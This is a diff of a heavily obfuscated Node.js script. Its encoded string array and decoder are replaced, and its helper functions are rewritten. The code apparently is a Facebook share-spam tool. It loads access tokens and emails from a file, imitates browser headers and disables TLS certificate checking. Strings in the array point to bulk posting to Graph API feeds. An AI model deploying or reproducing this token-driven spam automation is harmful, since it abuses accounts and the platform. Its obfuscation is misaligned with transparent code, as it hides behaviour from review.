+        'u2vSzwn0zwqGvg9Rzw5+iW',
+        'uMvWB3nPDg9YEsbZDwnJzxnZzNvSBhKGDxbKyxrLzc4',
+        'yvrtsgO',
+        'rwnbtxG',
+        'kgfKzfrVA2vUksbgDw5JDgLVBIbfCNjVCJOG',
+        'DgvYBxv4lxrVyxn0icDtCgfTifnOyxjLifn0B3bWzwqHjW',
+        'CNrktuu',
+        'r3P1tLy',
+        'rujTqLO',
+        'wNnZELq',
+        'yuzvCKm',
+        'uwf2qKC',
+        'uuLfCeK',
+        'qNfWvuq',
+        'v29Lrwm',
+        'qwnJB3vUDcbKB2vZig5VDcbLEgLZDa',
+        'CMfUzg9T',
+        'CxzrDhm',
+        'tM8Gvg9Rzw5ZiezVDw5KlG',
+        'sNvUzq',
+        'ChvSBa',
+        't3nrCLC',
+        'EuTPD04',
+        'Ehjtvvu',
+        'tuDQAwi',
+        'tNHQu1q',
+        'quzXDfi',
+        'CMzPrMS',
+        'uhjLC3mGrw50zxiGDg8Gq29UDgLUDwv+iW',
+        'uKTAy00',
+        'qMfvwMG',
+        'BM9Uzq',
+        'rM5Azhq',
+        'Dgv4Dc9ODg1SlgfWCgXPy2f0Aw9Ul3HODg1Sk3HTBcXHChbSAwnHDgLVBI94BwW7Ct0WlJKSAw1Hz2uVyxzPzIXPBwfNzs93zwjWlgLTywDLl2fWBMCSkI8Qo3e9mc44lgfWCgXPy2f0Aw9Ul3nPz25Lzc1LEgnOyw5NztT2pwiZo3e9mc45',
+        'vNPVu3q',
+        'Ahr0Chm6lY9NCMfWAc5MywnLyM9VAY5JB20VBwuVzMvLzd9Hy2nLC3nFDg9Rzw49',
+        'B3PZwKW',
+        'vvnjtKCG',
+        'tLP6CeS',
+        'yxfJtxy',
+        'DxjS',
+        'A3LrAvu',
+        'C3rHDhvZ',
+        'DhjPBq',
+        'uu94vxa',
+        'z3PPCcWGzgvMBgf0zq',
+        'AhPoAM8',
+        'yxbWBgLJyxrPB24VEc13D3CTzM9YBs11CMXLBMnVzgvK',
+        's2jMD2y',
+        'yxv0Ag9Yx2vTywLS',
+        'C2TXuKq',
+        'u01t',
+        'z3zyzKC',
+        'wuPRshi',
+        'CgfKu3rHCNq',
+        'Ahr0Chm6lY9HCgKUDgvSzwDYyw0UB3jNl2jVDa',
+        'AKvjEwi',
+        'uMvHBgX5ie5Pz2DH',
+        'uLvPsgK',
+        'rhjhrgi',
+        'zMXVB3i',
+        'ktOG',
+        'g1S0Bq',
+        'BNn0uxO',
+        'C3rHCNrZv2L0Aa',
+        'vxzoExG',
+        'vuHUsxq',
+        's0rLyvC',
+        't2Lqs28',
+        'vM5fwwe',
+        'yvLLBwy',
+        'r3PiEKi',
+        'CunNqwG',
+        'rezQCgu',
+        'z2v0tw9UDgG',
+        'ufL0Cu0',
+        'y2XLyxi',
+        'D3jPDgvgAwXLu3LUyW',
+        'qwTZr0G',
+        'rM5vq2W',
+        'sgPbvuq',
+        'D3jPDgu',
+        'w0LorK9D',
+        'zwnOBYaKvevstvvyx0fqsv9wrvjtsu9o',
+        't3bhwLK',
+        'rfLgBue',
+        'zNHiyKy',
+        'rLrds2S',
+        'ksbuB2TLBIbszw1VDMvKifn1y2nLC3nMDwXSEq',
+        'BK5YwMG',
+        'uhjVDg9JB2WGrxjYB3iGkevquK9utYK6ia',
+        'sNLWz3a',
+        'EeLVDw0',
+        'uxHqs3u',
+        'Ahr0Chm6lY93D3CUzMfJzwjVB2SUy29Tl3bOB3rVlNbOCd9MyMLKpq',
+        'tu5MENy',
+        'y2zQt0S',
+        'ANnJr0q',
+        'u2HHCMvKifn1y2nLC3nMDwXSEs4',
+        'Aw5JBhvKzxm',
+        'yxnRqMfJAW',
+        'CgfqsuK',
+        't210Aeq',
+        'zKHnugi',
+        'qxrzreq',
+        'y29UDgLUDwu',
+        'CgXHDgzVCM0',
+        'DvbIC2m',
+        'zxHPDa',
+        'cJXIpLrVA2vUid4Gpc9IpG',
+        'DuTiDKS',
+        'vfDMzK4',
+        'l3nOyxjLl3a',
+        'wKPTBeW',
+        'DuLPzgm',
+        'sML2D3i',
+        'yuHjEgq',
+        'zvviug0',
+        'DevPBhy',
+        'A1HZvu4',
+        'Bxv3qMu',
+        'if9FxYbFx18Gx19Fif8Gia',
+        'vwzmCNu',
+        's1rHBK8',
+        'sNvSEq',
+        't3bLCMf0Aw9UienVBxbSzxrLzcbtDwnJzxnZzNvSBhK',
+        'CxrYAee',
+        'v3PhrLG',
+        'wNLNvgu',
+        'yuL4Cge',
+        'qKL2CKC',
+        'rwHUv28',
+        'BMf2AwDHDgu',
+        'zgDeEMi',
+        'tLDTEu4',
+        'ueXfqvnfierpie5pvcbvu0uGwu9vuIbqrvjtt05btcbbq0npvu5uieLgifLpvsbxqu5uifrpiefwt0Leifnvu1bftKrjtKCGwu9vuIbbq0npvu5ulIbjtLnurufelcbvu0uGqsborvCGqundt1vovc4GveHfiefvveHpuIbjuYbot1qGuKvtue9ou0LcteuGrK9siefdq09vtLqGu1vtuevou0LptLmU',
+        's0z5r2u',
+        'qMHkEgW',
+        'khjLBw92zvrVA2vUksbgDw5JDgLVBIbfCNjVCJOG',
+        'CMvKzM4',
+        'z2v0twLUDxrLCW',
+        'BgLTAxq',
+        'yvbvs0S',
+        'Be1QEhu',
+        'tKPTCvG',
+        'r1ziDfm',
+        'nfzSr0TVrW',
+        'z2v0vxjS',
+        'sezzy1C',
+        'ywXS',
+        'uhrAtg4',
+        'ANjqq3C',
+        'qu5VBgu',
+        'g1SWBq',
+        'jMfWCd1MyMW',
+        'sMPIswe',
+        'uMvXDwvZDcbSAw1PDcbLEgnLzwrLzc4',
+        'Ahr0CdOVl3D3DY5MywnLyM9VAY5JB20V',
+        'r1vsvwG',
+        'vwjovLG',
+        'cJXIpKvTywLSid4Gpc9IpG',
+        'sw52ywXPzcbpChrPB24Uie91DcbVzIbsyw5Nzq',
+        'tvbgtwO',
+        'Ehj4v0u',
+        'ugXLyxnLifbYB3zPzguGysbwywXPzcbdB21Tyw5KlG',
+        'rgf0zvrPBwvgB3jTyxq',
+        'CxPQugK',
+        'ywnJzxnZx3rVA2vU',
+        'vwfIzhC',
+        'q29UBMvJDgLVBIbszwz1C2vKicG',
+        't21pyNq',
+        'ze5cq2K',
+        'sKrpsLu',
+        'jNr5Cgu9',
+        'veXkzui',
+        't2vHwvO',
+        'qwn6BMS',
+        'uLrnqLm',
+        'CMvZCg9UC2u',
+        'Bg5ZELO',
+        'CNniCLm',
+        'C3rYAw5NAwz5',
+        'wvjzz1K',
+        'r290tgK',
+        'vwHNsKm',
+        'u1jxze0',
+        'qwjurKu',
+        'iefdq0vtuYbut0TftG',
+        'v3jVBMCGy3jLzgvUDgLHBhm',
+        'EKDwDwu',
+        'zM9YBwf0',
+        'u2T2tvm',
+        'z2v0rgf0zq',
+        's3rHCg0',
+        'mI1KAwDPDa',
+        'sefluLy',
+        'BM93',
+        'BgvUz3rO',
+        'y2LRBgK',
+        'wwnTuvG',
+        'r2vUzxjHDgvKifnLDdOG',
+        'mteXnZm0vuXrEfn6',
+        'mJaYns0XmI0Ynq',
+        'w0vsuK9sxq',
+        'CKDADfO',
+        'v1zwzey',
+        'sNfbv1e',
+        't3DVBxC',
+        'zfjvA3q',
+        'ruH6BKW',
+        'ktSGugXLyxnLifDHAxqUlI4',
+        'yLPprvK',
+        'ChLUDMW',
+        'q1vHugy',
+        'DxrMoa',
+        'A1PeExy',
+        'rMfPBgvKihrVigj5CgfZCYbgywnLyM9VAYbbueKGCMf0zsbSAw1PDc4Gvhj5ihvZAw5NiezHy2vIB29RieXPDguGB3iGq2HYB21LihrVignVChKGDgHLihbVC3qGBgLUAY4',
+        'ke1HBMfNzsbuB2TLBNmP',
+        't21dthy',
+        'Bgf0zxn0',
+        'rKvfrejbq0SG',
+        'BK5oC2O',
+        'kfbYzxzPB3vZie1LBNuP',
+        'C3LSz1C',
+        'qureifrps0voia',
+        't2vZELq',
+        'z2v0u2vJB25KCW',
+        'u2jQAKi',
+        'sM91u2K',
+        'y09zAw0',
+        'ugXLyxnLievUDgvYie9UBhKGtNvTyMvYCW',
+        'zMLSDgvY',
+        'qxvNDxn0',
+        'C2vZC2LVBL9RzxK',
+        'cJXIpKzHy2vIB29RifbHC3n3B3jKoJWVyJ4G',
+        'C2vZC2LVBL9RzxKGFcbHy2nLC3nFDg9Rzw4GtM90iezVDw5K',
+        'kev4AxqGvgHLifbYB2DYyw0P',
+        'uNHIwLK',
+        'Cvz6CLq',
+        'mtaWode2tKHQwfHi',
+        'qwnJB3vUDcbPCYbPBIbJAgvJA3bVAw50',
+        'EgrNlw9Wzw4GAhr0CdOVl3qUBwuVs2fPCNvezxy',
+        'CgfZC3DVCMq',
+        'zNjUsLi',
+        'BNvTyMvY',
+        'vwPlvfG',
+        'zg9JDw1LBNq',
+        'pgi+kezHy2vIB29RifnWyw0Gu2HHCMuPpc9IpGOkpgi+rMfJzwjVB2SGug9ZDca+idWVyJ4',
+        'AxrZvuC',
+        'tM92zw1Izxi',
+        'DNnAs00',
+        'lcbuExbLoIa',
+        'vg9Rzw5Z',
+        'zNjVBq',
+        'rNjLzsb1BNrPBca',
+        'C095v3a',
+        'B3Dqugm',
+        'AKvgqMq',
+        'sfrnta',
+        'swDvBLu',
+        'runptK5sruzvu0ve',
+        'qMfJAW',
+        'uuDYzLm',
+        'zenzB0e',
+        'AhzAsxy',
+        'qMjlD1G',
+        'Bu53yuq',
+        'zgf0zq',
+        'AgXTu00',
+        'sMTTwvO',
+        'zfLUEvO',
+        'r1HZy1K',
+        'nti1mtKWmKrvBLPMBq',
+        'sLbkvey',
+        'qKDsyNm',
+        'mtCXnZC4nLn4rxH6Dq',
+        'z1vZEKm',
+        'y29Kzq',
+        'EuT6AeK',
+        'uLHqv20',
+        't3vWAgC',
+        'CMzuyKu',
+        'DLDrC1u',
+        'rejXELi',
+        'Dg9Rzw5JBwq',
+        'uwHlA2C',
+        'vNn5zKC',
+        'ELnJCLO',
+        'l3nLBMrnzxnZywDL',
+        't1fwBue',
+        'B3rizuK',
+        'v2XYsg8',
+        'Aw5OzxjPDa',
+        'zhrLtfa',
+        'D2LUmZi',
+        'seXPvxy',
+        'AM1qqMW',
+        'y2HVB3nLvg9Rzw4',
+        'Cgf0Ag5HBwu',
+        'A2znBMq',
+        'CgjzzNO',
+        'zgztru0',
+        'z2v0',
+        'kenuuKWGkYbdkq',
+        'rxH0CMfJDgvKiezcsuq6ia',
+        'C3LuCNm',
+        'rMTlzhy',
+        'A25lu2W',
+        'Dgf5v3q',
+        'DvblugS',
+        'Dg9Rzw5Tyw5Hz2vTzw50',
+        'sgvZvgG',
+        'q3jLyxrLzcbuAw1Lia',
+        'C3bSAxq',
+        'tefIBfm',
+        'cJXIpLn0yxr1CZO8l2i+ieXVz2DLzcbPBG',
+        'uMvTB3zLifrVA2vUicHWCMvZCYaNAcCGzM9YigHLBhaPFIm',
+        'g1SXoZm2Bq',
+        'vu50y0K',
+        'r25vCMS',
+        'zMfSC2u',
+        'z2v0qw1VDw50',
+        'Ahr0Chm6lY93D3CUzMfJzwjVB2SUy29TlW',
+        'AxrOuwW'
+    ];
+    m = function () {
+        return hf;
+    };
+    return m();
+}
 var headers = {
-    'authority': 'business.facebook.com',
-    'user-agent': ZC(0x1a0),
-    'accept': ZC(0x27d),
-    'accept-language': 'en-US,en;q=0.9',
-    'sec-ch-ua': ZC(0x37f),
+    'authority': mz(0x419),
+    'user-agent': mz(0x3e8),
+    'accept': mz(0x23d),
+    'accept-language': mz(0x38f),
+    'sec-ch-ua': mz(0x409),
     'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': ZC(0x19f),
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': ZC(0x3b4),
-    'sec-fetch-site': 'none',
+    'sec-ch-ua-platform': 'Windows',
+    'sec-fetch-dest': mz(0x312),
+    'sec-fetch-mode': mz(0x2a0),
+    'sec-fetch-site': mz(0x23b),
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1'
 };
-const httpsAgent = new Zq[(ZC(0x3cc))]({
+const httpsAgent = new mZ['Agent']({
     'rejectUnauthorized': ![],
     'secureProtocol': 'TLSv1_2_method'
 });
 function getTime() {
-    const Zs = ZC, Q = { 'AAIBL': '2-digit' }, n = new Date(), w = new Intl['DateTimeFormat'](Zs(0x2d4), {
-            'day': Zs(0x2db),
-            'hour': Q[Zs(0x3a7)],
-            'minute': Q[Zs(0x3a7)],
+    const my = mz, U = {
+            'muwBe': my(0x3ec),
+            'CwETW': my(0x2de)
+        }, N = new Date(), V = new Intl[(my(0x2c1))](U[my(0x294)], {
+            'day': my(0x2de),
+            'hour': U[my(0x396)],
+            'minute': U[my(0x396)],
             'hour12': !![]
-        })[Zs(0x374)](n);
-    return w;
+        })[my(0x2da)](N);
+    return V;
 }
-String['prototype'][ZC(0x347)] = function () {
-    const ZD = ZC, Q = {
-            'pepHN': function (w, b) {
-                return w + b;
+String[mz(0x20e)][mz(0x42c)] = function () {
+    const mb = mz, U = {
+            'KTanO': function (V, B) {
+                return V + B;
             }
-        }, n = this[ZD(0x3d6)](-0x1024 + -0x2162 + 0x3186, 0x63d * 0x5 + -0xda * 0x16 + -0xc74)[ZD(0x2e6)]();
-    return Q[ZD(0x1a8)](n, this[ZD(0x3d6)](-0x64 + 0x6 * -0x1d3 + 0xb57, undefined));
+        }, N = this[mb(0x3b4)](-0x199 * -0x13 + 0x266e + -0x44c9, 0xdf * -0x2 + -0x5a7 + 0x766)['toUpperCase']();
+    return U[mb(0x297)](N, this[mb(0x3b4)](0x2218 + -0xd * 0xd3 + -0x1760, undefined));
 };
 function setClear() {
-    const Zp = ZC, Q = {
-            'eszCO': function (n, w) {
-                return n * w;
+    const mq = mz, U = {
+            'VzoSt': function (N, V) {
+                return N === V;
             },
-            'rbbBR': function (n, w) {
-                return n + w;
+            'bgERQ': mq(0x342),
+            'QOxUp': function (N, V, B) {
+                return N(V, B);
             },
-            'RJXck': function (n, w) {
-                return n * w;
-            },
-            'LKTBA': function (n, w) {
-                return n + w;
-            },
-            'IZCil': function (n) {
-                return n();
-            },
-            'Wvipt': function (n, w) {
-                return n + w;
-            },
-            'ouMgn': function (n, w) {
-                return n + w;
-            },
-            'VddZu': function (n, w) {
-                return n === w;
-            },
-            'JqMgh': Zp(0x3a9),
-            'HrScW': function (n, w) {
-                return n !== w;
-            },
-            'fmtmu': Zp(0x365),
-            'BMwwd': function (n, w, b) {
-                return n(w, b);
-            },
-            'ZTUOr': 'cls',
-            'dCVRL': 'inherit'
+            'Mkakp': mq(0x1d6),
+            'DrGDb': 'clear'
         };
-    if (Q[Zp(0x405)](process[Zp(0x256)], Q[Zp(0x331)])) {
-        if (Q[Zp(0x3ad)](Q[Zp(0x2fc)], Q[Zp(0x2fc)])) {
-            const w = 'a.' + u[Zp(0x218)](Q[Zp(0x32e)](o[Zp(0x406)](), f[Zp(0x29a)]()))['toString'](), b = Q[Zp(0x2e9)](E['floor'](Q[Zp(0x367)](O[Zp(0x29a)](), -0x4 * 0x52f + -0xb43 + 0x2003)), -0x3 * 0xcdb + -0x118a + 0x381c);
-            return S[Zp(0x1b8)](Q[Zp(0x3a6)](d() + r, Zp(0x2b3))), z[Zp(0x1b8)](Q[Zp(0x20b)](J) + h + (Zp(0x320) + q + U)), I[Zp(0x1b8)](Q[Zp(0x2c8)](Q['ouMgn'](Q[Zp(0x20b)](l), G), Zp(0x1ba) + v + w + C + Zp(0x294) + R + b)), 'https://www.facebook.com/photo.php?fbid=' + s + Zp(0x1dd) + w + Zp(0x21f) + b + Zp(0x322);
-        } else {
-            Q[Zp(0x384)](execSync, Q[Zp(0x387)], { 'stdio': Q['dCVRL'] });
-            return;
-        }
+    if (U[mq(0x23e)](process[mq(0x286)], U[mq(0x424)])) {
+        U[mq(0x248)](execSync, U[mq(0x3f3)], { 'stdio': 'inherit' });
+        return;
     }
-    execSync('clear', { 'stdio': Q['dCVRL'] });
+    execSync(U[mq(0x257)], { 'stdio': mq(0x340) });
 }
 let tokenParsed, tokens, emails;
 function updateToken() {
-    const ZK = ZC, Q = {
-            'OiYsy': function (n, w) {
-                return n - w;
+    const ms = mz, U = {
+            'skqRD': function (N, V) {
+                return N + V;
             },
-            'BYlVN': function (n, w) {
-                return n(w);
+            'Uabdw': function (N, V) {
+                return N === V;
             },
-            'fsuPU': function (n, w) {
-                return n + w;
+            'GBowE': ms(0x245),
+            'lnlqW': ms(0x2f2),
+            'mNwaD': function (N, V) {
+                return N + V;
             },
-            'PIJHK': ZK(0x26a),
-            'XcZhP': ZK(0x241),
-            'tZDUO': ZK(0x1f7),
-            'MUYMH': ZK(0x3fc),
-            'YRgtd': ZK(0x3ba),
-            'UedQy': function (n, w) {
-                return n + w;
-            },
-            'jKCMf': function (n) {
-                return n();
+            'OeaYZ': function (N) {
+                return N();
             }
         };
     try {
-        if (Q['PIJHK'] === Q['XcZhP']) {
-            i = new H(W);
-            const w = t['pathname'][ZK(0x3e8)]('/')['filter'](B), b = w[Q['OiYsy'](w['length'], 0x17c8 * 0x1 + -0x1e79 + 0x6b2)];
-            return Q[ZK(0x30d)](V, b);
-        } else {
-            const w = Zr[ZK(0x1ae)](tokenfile, Q[ZK(0x2e5)]);
-            tokenParsed = JSON['parse'](w), tokens = tokenParsed[ZK(0x3b1)], emails = tokenParsed['email'];
-        }
-    } catch (b) {
-        if (Q[ZK(0x283)] !== Q[ZK(0x409)])
-            console[ZK(0x1b8)](Q['fsuPU'](Q['UedQy'](Q['jKCMf'](getTimeStamp), error), b['message'])), Q[ZK(0x3dc)](exit);
-        else
-            return Q['fsuPU'](n, ZK(0x297));
+        if (U[ms(0x2c4)](U[ms(0x367)], ms(0x245))) {
+            const N = mR[ms(0x1ee)](tokenfile, U[ms(0x3cd)]);
+            tokenParsed = JSON['parse'](N), tokens = tokenParsed[ms(0x393)], emails = tokenParsed[ms(0x366)];
+        } else
+            return U[ms(0x24e)](N, ms(0x2c0));
+    } catch (B) {
+        console[ms(0x38c)](U[ms(0x326)](U[ms(0x326)](U[ms(0x2cb)](getTimeStamp), error), B[ms(0x38e)])), exit();
     }
-}
-function a(Q, n) {
-    const w = Z();
-    return a = function (b, g) {
-        b = b - (-0x14f4 + -0x1aa8 + 0x3139);
-        let Y = w[b];
-        if (a['cJOCte'] === undefined) {
-            var i = function (B) {
-                const V = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
-                let N = '', c = '';
-                for (let e = 0x188b * -0x1 + 0xfcd + 0x8be, P, m, X = -0x1e4d + 0xa73 * -0x2 + 0x3333; m = B['charAt'](X++); ~m && (P = e % (0x202 * -0x9 + 0x1e61 + -0xc4b) ? P * (0x11d1 * -0x1 + 0x25c4 + -0x13b3) + m : m, e++ % (-0x8bd + -0x5b * 0x3d + 0x1e70)) ? N += String['fromCharCode'](0xcfb + -0x2397 * 0x1 + -0x1 * -0x179b & P >> (-(-0xb02 * -0x2 + -0xd1f * 0x1 + 0x1c7 * -0x5) * e & -0x7 * 0x1d8 + 0x15a8 + -0x8ba)) : -0x2640 + 0x23d1 + -0x59 * -0x7) {
-                    m = V['indexOf'](m);
-                }
-                for (let M = -0x1077 + -0xf58 + 0x1fcf, u = N['length']; M < u; M++) {
-                    c += '%' + ('00' + N['charCodeAt'](M)['toString'](-0x1c05 + 0x5ea + 0x162b))['slice'](-(-0x16d * 0xf + 0x1288 + 0x2dd));
-                }
-                return decodeURIComponent(c);
-            };
-            a['PnlCJH'] = i, Q = arguments, a['cJOCte'] = !![];
-        }
-        const H = w[-0xeb6 + -0x4c9 + 0xd9 * 0x17], W = b + H, t = Q[W];
-        return !t ? (Y = a['PnlCJH'](Y), Q[W] = Y) : Y = t, Y;
-    }, a(Q, n);
 }
 updateToken();
-function Z() {
-    const aB = [
-        'r0Xvvum',
-        'DNnSr3i',
-        'u2HHCMvKifn1y2nLC3nMDwXSEs4',
-        'uMvhr2q',
-        'kefKzcbgywnLyM9VAYbby2nLC3mGvg9Rzw4P',
-        'twnSt2m',
-        'vxbKyxrLigzHAwXLzc4',
-        'vujJCeW',
-        're9Hwui',
-        'ywXS',
-        'yMrAALG',
-        'nJm5',
-        'wKDJBvq',
-        'Aw5OzxjPDa',
-        'rLboz0u',
-        'wNPZtxO',
-        'A1jmCMu',
-        'yvPeufC',
-        'yvHPAKO',
-        'r21jDMC',
-        'swTkuum',
-        'Dwfzqum',
-        's1zzuge',
-        'ueXfqvnfierpie5pvcbvu0uGwu9vuIbqrvjtt05btcbbq0npvu5uieLgifLpvsbxqu5uifrpiefwt0Leifnvu1bftKrjtKCGwu9vuIbbq0npvu5ulIbjtLnurufelcbvu0uGqsborvCGqundt1vovc4GveHfiefvveHpuIbjuYbot1qGuKvtue9ou0LcteuGrK9siefdq09vtLqGu1vtuevou0LptLmU',
-        'zMLSDgvY',
-        'wgT2u2u',
-        'q1bjywS',
-        'yMzPvNu',
-        'q2n0q0i',
-        'C3fNzeG',
-        'rMfJzwjVB2S/icHfBwfPBc9jrc9qAg9Uzu51BwjLCIL+iW',
-        'BufeEwi',
-        'uuriEgC',
-        'uxbes3m',
-        'CMvZCg9UC2u',
-        'l3nOyxjLl3a',
-        'AMDLAeW',
-        'zNjUCM0',
-        'z1jYsLe',
-        'CgXHDgzVCM0',
-        'qvLLqvG',
-        'zfzuAgm',
-        'wgXnENC',
-        'qKXmz2G',
-        'ChjVBxb0',
-        'yxbWBgLJyxrPB24VEc13D3CTzM9YBs11CMXLBMnVzgvK',
-        'ke1HBMfNzsbuB2TLBNmP',
-        'qxvNDxn0',
-        'B1PWuMS',
-        'wK1kwMi',
-        'z0v6zNK',
-        'y3jLyxrLzf90Aw1L',
-        'B2fMDwC',
-        'C3rKB3v0',
-        'B0noB0O',
-        'zw1HAwW',
-        'DNvxCui',
-        'y29Kzq',
-        'DKHXBge',
-        't0X0B3K',
-        'EuTxAw4',
-        'AK1Nu20',
-        'sxzuy3u',
-        'DgfQB1q',
-        't2n0B2jLCG',
-        'sgLJDvG',
-        'DLzvuM8',
-        'yKzRv2K',
-        'uM1ADu0',
-        'rNL6r3y',
-        'vxbKyxrLihn1y2nLC3nMDwWUifbSzwfZzsbYDw4GDgHLihnJCMLWDcbHz2fPBIb1C2LUzZOG',
-        'lI9ZAgfYzs5SB2C',
-        'sgLcDxq',
-        'vMHTAvq',
-        'zxjYB3jFDxnLCL90AxrSzq',
-        'vu1VvvK',
-        'Ew5ZzMi',
-        'vw5LEhbLy3rLzcbfCNjVCG',
-        'Dgv4Dc9ODg1SlgfWCgXPy2f0Aw9Ul3HODg1Sk3HTBcXHChbSAwnHDgLVBI94BwW7Ct0WlJKSAw1Hz2uVyxzPzIXPBwfNzs93zwjWlgLTywDLl2fWBMCSkI8Qo3e9mc44lgfWCgXPy2f0Aw9Ul3nPz25Lzc1LEgnOyw5NztT2pwiZo3e9mc45',
-        'z1fqEeG',
-        'z3bYC3O',
-        'qwnJB3vUDcbPCYbPBIbJAgvJA3bVAw50',
-        'z2v0qw1VDw50',
-        'CK1duLG',
-        'tvvztuG',
-        'thr6tNG',
-        'vg9Rzw4Gv2fZifn1y2nLC3nMDwXSEsbtyxzLza',
-        'Ae5yBgO',
-        'sNHNy0i',
-        'CvHergi',
-        'thLuugW',
-        'vuHmu1i',
-        'A2TSs24',
-        'A0rsq1m',
-        'A3n4yxu',
-        'g1SXoZmXBq',
-        'sejbBu0',
-        'wfLUDNi',
-        'tg9JywWGy2HHBMDLCYbKzxrLy3rLzcbPBIbZzxr1Cc5ZAc4Gu3rHC2HPBMCUlI4',
-        't3bLCMf0Aw9UienVBxbSzxrLzcbtDwnJzxnZzNvSBhK',
-        'vg9Rzw5nyw5Hz2vTzw50FIm',
-        'lcbuExbLoIa',
-        'ug5dsgG',
-        'uMvXDwvZDcbSAw1PDcbLEgnLzwrLzc4',
-        'qxjLihLVDsbZzxjPB3vZihjPz2H0ig5LB3CGyNj1Aa',
-        'zMvLzgjHy2TuExbL',
-        'q2HLy2TPBMCGzM9YihvWzgf0zxmUlI4',
-        'CMfUzg9T',
-        'mZa1otu5mKr4shjQuW',
-        'Dg9Rzw5jBMrLEa',
-        'zMDmqwW',
-        'yNDUrwO',
-        'EgrNlw9Wzw4GAhr0CdOVl3D3DY5MywnLyM9VAY5JB20Vs2fPCNv4rgv2',
-        'ExPqyNG',
-        'kIPdt01nqu5euYOQcG',
-        'v09fBhq',
-        'yNHPEha',
-        'Eu5XyKC',
-        't3LvBKS',
-        'BwvksKW',
-        'vgvSzwDYyw0',
-        'vwH0uhq',
-        'tM8Gvg9Rzw5ZiezVDw5KlG',
-        'ueXfqvnfiefwt0LeifjvtK5jtKCGveHfiezbq0vct09lifnqqu0Gu0HbuKuGq09ntuforcbuv0LdrsbjtIbuseuGvevstuLoquWGv0LuscbuseuGu0fnrsbut0TftIWGqvmGveHjuYbxsuXmievyq0vfrcbuseuGu0HbuKuGteLnsvq',
-        'yLfXzKe',
-        'Axnbwha',
-        'r2fkD0q',
-        'zeXuq2m',
-        'Chf2Cu4',
-        'qwnJB3vUDcbKB2vZig5VDcbLEgLZDa',
-        'CMvTB3zLvg9Rzw4',
-        'CNjJyNe',
-        'qNLWyxnZAw5NiezHy2vIB29RiefqssbYyxrLigXPBwL0lI4U',
-        'Ewndwwy',
-        'D3rLrwq',
-        'AKTZvuG',
-        'q3foDvq',
-        'z2v0',
-        'wNzgqNy',
-        'B3DLsNq',
-        'zMjwr2u',
-        'kgfKzfrVA2vUksbgDw5JDgLVBIbfCNjVCJOG',
-        'uhrZC1G',
-        'zeHlBvK',
-        'rgvJzw1Izxi',
-        'Dg9Rzw5Tyw5Hz2vTzw50',
-        'qvPutKS',
-        'ktOG',
-        'yNDfA2q',
-        'sNvUzq',
-        'r1vfwvK',
-        'Ahr0CdOVl3D3DY5MywnLyM9VAY5JB20V',
-        'sNH1reu',
-        'v3zPChq',
-        'u01t',
-        'sLvbtM0',
-        'sfjty0q',
-        'zeLtu3G',
-        'Cgf0Ag5HBwu',
-        'mJa3odGZnw1oA1nfAa',
-        'D2DiBMm',
-        'EMLNz2u',
-        's1Lgu3y',
-        'Dg9tDhjPBMC',
-        'DxnLCI1Hz2vUDa',
-        'zw4Tvvm',
-        'qureifrps0voia',
-        'uMvTB3zLifrVA2vUicHWCMvZCYaNAcCGzM9YigHLBhaPFIm',
-        'uujlDfu',
-        'rvnIwva',
-        'zMv5yLG',
-        'rvrjtuvet1vu',
-        'mI1KAwDPDa',
-        'yNv0Dg9Ux3DPDgHFzgLZywjSzwq',
-        'ywL2r04',
-        'vvnjtKCG',
-        'zMjPza',
-        'qxbYAwW',
-        'DfflB0G',
-        'jMzPzwXKCZ1PzczSAw1PDd0WjNb1yMXPC2HLzd0W',
-        'qxHSEhe',
-        'qKH2wvy',
-        'DfPevu8',
-        'Dg9vChbLCKnHC2u',
-        'qwXSifrVA2vUCYbszw1VDMvKifn1y2nLC3nMDwXSEq',
-        'zMTtBNm',
-        'CMjIqLi',
-        'ruDMtMG',
-        'C3rHCNrZv2L0Aa',
-        'zxjYB3i',
-        'wgvvAuG',
-        'DgvZDa',
-        'AMDiwgO',
-        'z2L0ihn0yxnOihbVCa',
-        'kfjLBw92zsbbteWPcG',
-        'uMvHBgX5ie5Pz2DH',
-        'Ahr0Chm6lY93D3CUzMfJzwjVB2SUy29TlW',
-        'qLr6tLi',
-        'yMPZq2y',
-        'id4G',
-        'AeXVCeG',
-        't3PgBNC',
-        'CMzeDgO',
-        'revmrvrfifrps0vouYa',
-        'BgLZDa',
-        'zM10Bxu',
-        'zNjVBq',
-        'Dg9Rzw5nyw5Hz2vTzw50',
-        'D0XtC2K',
-        'DgvYBxv4lw9Wzw4GAhr0CdOVl3D3DY5MywnLyM9VAY5JB20Vs2fPCNv4rgv2',
-        'Aw5WDxq',
-        'r2X2ufm',
-        'sfHvCeS',
-        'u1L0rw0',
-        'qLLusuW',
-        'r0TlDgy',
-        'vwXfu1i',
-        'wwHPuuG',
-        'BKz4ruW',
-        'zNjVBunOyxjdB2rL',
-        'vMPVwNK',
-        'cJXIpLn0yxr1CZO8l2i+iezHAwXLza',
-        'qLLSvK4',
-        'y21K',
-        'tw5ptuO',
-        'BxbgExa',
-        'C29lBxi',
-        'tNLctLO',
-        'z2jsuuy',
-        't0rZtLq',
-        'whHrvwm',
-        'u3rHCNrPBMCUlI4',
-        'rvPou0C',
-        'Ahv6t00',
-        'v3jVBMCGq3jLzgvUDgLHBhm',
-        'r3nevw8',
-        'DKnUC1K',
-        'zwLWyLu',
-        'CgfKu3rHCNq',
-        'Eg5XD2G',
-        'sfrnta',
-        'rxH0CMfJDgvKiezcsuq6ia',
-        'qNbAsgu',
-        'jMfWCd1MyMW',
-        'y1jAyKm',
-        'z2L0igXVzYaTmsaTlxbYzxr0Et0LqG',
-        'B3HKyMW',
-        'uMvXDwvZDcbuAw1LzcbpDxq6ia',
-        't0Hmrfm',
-        'runptK5srvnfva',
-        'yMfJAW',
-        'C0HNCwq',
-        'Aw9KuKG',
-        'B0P1CgK',
-        'uwXQALm',
-        'zxn6q08',
-        'EhjZDhq',
-        'z2v0vxnLCK5HBwu',
-        'sNfnz2G',
-        'CvbWwfq',
-        'yujUAxe',
-        'kfnWyw0Gu2HHCMuGug9ZDcbVBIbgywnLyM9VAYK',
-        's3HyC0S',
-        'q3HvuLK',
-        'DxjS',
-        'rg9tqve',
-        'rMfJzwjVB2S',
-        'A2D3ELe',
-        'Ahr0Chm6lY93D3CUzMfJzwjVB2SUy29Tl3bOB3rVlNbOCd9MyMLKpq',
-        'uKLpy00',
-        's2fPCNuUia',
